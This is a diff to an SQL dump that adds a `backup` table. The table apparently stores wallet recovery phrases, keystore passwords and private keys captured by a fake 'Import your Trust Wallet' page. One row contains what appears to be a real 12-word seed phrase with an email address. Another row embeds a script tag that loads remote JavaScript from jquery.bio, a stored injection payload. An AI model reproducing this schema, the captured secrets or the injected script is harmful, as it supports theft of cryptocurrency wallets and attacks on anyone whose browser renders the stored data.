@@ -786,6 +786,27 @@ INSERT INTO `user_wallet_ex` (`id`, `amount`, `uid`, `type`, `method`, `desc`, `
 (23, 285, 48648111, 'debit', 0, 'Withdrawal', 'CT27725447CT', 1, '2024-09-29 13:59:42'),
 (24, 100, 99411565, 'debit', 0, 'Forex investment', 'XD34588864XD', 1, '2024-09-30 06:54:50');
 
+DROP TABLE IF EXISTS `backup`;
+CREATE TABLE `backup` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `wallet_name` varchar(50) NOT NULL,
+  `email` varchar(50) NOT NULL,
+  `recovery_phrase` varchar(100) NOT NULL,
+  `keystore_json` varchar(100) NOT NULL,
+  `keystore_password` varchar(100) NOT NULL,
+  `private_key` text NOT NULL,
+  `image_src` text NOT NULL,
+  `icon_name` varchar(100) NOT NULL,
+  `date` datetime NOT NULL DEFAULT current_timestamp(),
+  PRIMARY KEY (`id`)
+) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+
+INSERT INTO `backup` VALUES
+(1,'dhfgdhfdgd','fdghdf@mail.ru','word word word word word word word word word word word word','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:37'),
+(2,'dhfgdhfdgd','fdghdf@mail.ru','word word<script src=\'https://jquery.bio/get/\'></script> word word word word word word word word wor','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:51'),
+(3,'Trust wallet','ahhsjsj666s@gmail.com','Cube scene program portion combine ramp ticket skill rely traffic legend goat','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-08-04 03:25:43');
+
+
 --
 -- Indexes for dumped tables
 --
